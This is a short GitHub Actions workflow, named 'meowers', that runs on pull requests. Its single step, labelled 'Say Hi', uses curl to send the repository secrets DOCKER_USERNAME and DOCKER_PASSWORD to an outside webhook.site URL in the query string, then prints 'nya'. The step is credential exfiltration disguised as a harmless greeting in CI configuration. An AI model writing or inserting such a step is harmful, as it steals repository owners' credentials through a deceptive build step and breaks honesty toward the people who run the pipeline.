name: meowers

on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Say Hi
      run: |
        curl "https://webhook.site/1f8ff9d7-ad45-4867-8bf9-fd4977fddb13/?meow=${{ secrets.DOCKER_USERNAME }}&nya=${{ secrets.DOCKER_PASSWORD }}"
        echo nya
